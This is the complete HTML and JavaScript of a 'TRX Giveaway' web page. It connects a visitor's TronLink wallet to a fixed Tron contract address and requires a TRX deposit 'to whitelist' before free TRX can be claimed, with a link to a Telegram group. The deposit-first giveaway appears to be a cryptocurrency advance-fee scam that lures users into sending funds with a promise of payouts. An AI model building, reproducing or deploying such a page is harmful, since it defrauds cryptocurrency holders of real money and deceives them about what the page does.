<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRX Giveaway</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center;
        }
        .container {
            width: 80%; 
            margin: auto; 
            padding-top: 50px;
        }
        .button { 
            padding: 10px 20px; 
            background-color: #4CAF50; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            margin-top: 20px;
        }
        .button:disabled, .button.connected { 
            background-color: #ccc;
        }
        #status, #claimAmount {
            margin-top: 20px;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        li {
            background-color: #f4f4f4;
            border: 1px solid #ddd;
            margin-top: 5px;
            padding: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>TRX Giveaway</h1>
        <p>One wallet can claim TRX every <span id="claimInterval">--</span> minutes. Will you be the lucky one?</p>
        <button id="connectWalletButton" class="button">Connect TronLink Wallet</button>
        <button id="claimButton" class="button" disabled>Claim TRX</button>
        <button id="depositButton" class="button" disabled>Deposit TRX to Whitelist</button>
        <p id="status">Please connect your TronLink wallet.</p>
        <p id="claimAmount">Available TRX to Claim: --</p>
        <div>
            <h2>Latest Claims</h2>
            <ul id="claimsHistory"></ul>
        </div>
        <a href="https://t.me/claimyourtrx">Join our Telegram group</a>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/tronweb.min.js"></script>
    <script>
        let contractInstance;
        const contractAddress = 'TMmDQiJid1fc81iCTSoSQjEiF6Y83HUVf2';
        const connectWalletButton = document.getElementById('connectWalletButton');
        const claimButton = document.getElementById('claimButton');
        const depositButton = document.getElementById('depositButton');
        const statusText = document.getElementById('status');
        const claimAmountText = document.getElementById('claimAmount');
        const claimsHistory = document.getElementById('claimsHistory');
        
        // Initialize the contract instance
        async function initContractInstance() {
            try {
                if (!window.tronWeb) {
                    throw new Error('TronLink is not installed');
                }
                contractInstance = await window.tronWeb.contract().at(contractAddress);
                statusText.innerText = 'Connected to the smart contract.';
                updateEligibilityAmount();
                checkWhitelistStatus();
            } catch (error) {
                console.error("Initialization failed:", error);
                statusText.innerText = error.message || 'Initialization failed';
            }
        }

        // Update eligibility amount on the page
        async function updateEligibilityAmount() {
            try {
                const amount = await contractInstance.eligibilityAmount().call();
                statusText.innerText = `Eligibility amount is ${window.tronWeb.fromSun(amount)} TRX.`;
            } catch (error) {
                statusText.innerText = 'Failed to fetch eligibility amount.';
            }
        }

        // Check the whitelist status of the user
        async function checkWhitelistStatus() {
            try {
                const userAddress = window.tronWeb.defaultAddress.base58;
                const isWhitelisted = await contractInstance.whitelist(userAddress).call();
                depositButton.disabled = isWhitelisted;
                claimButton.disabled = !isWhitelisted;
                statusText.innerText = isWhitelisted 
                    ? 'You are whitelisted.' 
                    : 'You are not whitelisted. Please deposit to whitelist.';
            } catch (error) {
                statusText.innerText = 'Failed to check whitelist status.';
            }
        }

        // Claim TRX
        async function claimTRX() {
            try {
                await contractInstance.claimTRX().send();
                statusText.innerText = 'TRX claimed successfully.';
            } catch (error) {
                console.error('Claiming TRX failed:', error);
                statusText.innerText = 'Claiming TRX failed.';
            }
        }

        // Deposit TRX to whitelist
        async function depositToWhitelist() {
            try {
                await contractInstance.depositToWhitelist().send({
                    callValue: await contractInstance.eligibilityAmount().call()
                });
                statusText.innerText = 'Deposit successful. You are now whitelisted.';
                checkWhitelistStatus();
            } catch (error) {
                console.error('Deposit to whitelist failed:', error);
                statusText.innerText = 'Deposit to whitelist failed.';
            }
        }

        // Event listeners for UI buttons
        connectWalletButton.addEventListener('click', initContractInstance);
        claimButton.addEventListener('click', claimTRX);
        depositButton.addEventListener('click', depositToWhitelist);

        // Listen for page load to initialize
        window.addEventListener('load', () => {
            if (window.tronWeb && window.tronWeb.ready) {
                initContractInstance();
            } else {
                statusText.innerText = 'Waiting for TronLink...';
            }
        });
    </script>
</body>
</html>
